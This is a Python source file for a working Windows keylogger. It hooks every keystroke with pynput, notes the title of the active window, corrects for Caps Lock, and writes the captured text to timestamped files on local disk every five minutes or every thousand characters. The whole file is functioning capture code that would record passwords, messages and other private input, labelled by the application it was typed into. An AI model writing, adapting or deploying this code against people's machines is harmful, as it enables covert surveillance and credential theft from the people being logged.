import ctypes
import os
import threading
from datetime import datetime
from pynput.keyboard import Listener
import win32gui


class Keylogger:
    def __init__(self, working_dir=""):
        self.dir = working_dir
        self._CHAR_LIMIT = 1000
        self._MINUTES_TO_LOG_TIME = 5
        self._line_buffer, self._window_name = '', ''

    @staticmethod
    def _get_capslock_state():
        # using the answer here https://stackoverflow.com/a/21160382
        import ctypes
        hll_dll = ctypes.WinDLL("User32.dll")
        vk = 0x14
        return True if hll_dll.GetKeyState(vk) == 1 else False

    def _report_loop(self):
        self._log()
        threading.Timer(self._MINUTES_TO_LOG_TIME * 60, self._report_loop).start()

    def _log(self):
        now = datetime.now()
        filename = f"{now.year}-{now.month}-{now.day}_{now.hour}.txt"
        try:
            if not os.path.exists(self.dir):
                os.makedirs(self.dir)
            with open(os.path.join(self.dir, filename), "a") as f:
                f.write(self._line_buffer)
        except Exception as e:
            print(e)
        self._line_buffer = f"\n\n- [Time: {now.hour}:{now.minute}]\n"

    def _on_key_press(self, event):
        key = None
        try:
            key = event.char
        except:
            pass
        if key is None:
            key = str(event)
        if "Key." in key:
            key = key[4:]

        # 1. Detect the active window change - if so, LOG THE WINDOW NAME
        curr_window = ctypes.WinDLL('user32', use_last_error=True).GetForegroundWindow()
        event_window_name = win32gui.GetWindowText(curr_window)
        if self._window_name != event_window_name:
            window_buffer = '- [WindowName: ' + event_window_name + ']'  # update the line_buffer
            self._window_name = event_window_name  # set the new value
            self._log()  # log anything from old window / times
            self._line_buffer += f"{window_buffer}\n"  # value to begin with

        key_pressed = ""

        # 2. DETERMINE THE KEY_PRESSED GIVEN THE EVENT
        if key in ['ctrl_l', 'ctrl_r']:
            key_pressed = "<ctrl>"
        elif key in ['shift', 'shift_r']:
            key_pressed = "<shift>"
        elif key in ['alt_l', 'alt_gr']:
            key_pressed = "<alt>"
        elif key == 'space':
            key_pressed = " "
        elif key in ['something unique']:
            pass  # do something
        elif '<' in key and '>' in key:
            key = int(key[1:-1])
            if 96 <= key <= 105:
                key -= 96
            key_pressed = str(key)
        else:
            if len(key) == 1:
                # apply upper or lower case
                key_pressed = key
                if self._get_capslock_state():
                    key_pressed = key_pressed.upper() if key_pressed.islower() else key_pressed.lower()
            else:
                key_pressed = f"<{key}>"

        # 3. APPEND THE PRESSED KEY TO THE LINE_BUFFER
        self._line_buffer += key_pressed
        # 4. DECIDE ON WHETHER TO LOG CURRENT line_buffer OR NOT:
        if len(self._line_buffer) >= self._CHAR_LIMIT:
            self._log()

    def run(self):
        self._report_loop()
        with Listener(self._on_key_press) as t:
            t.join()
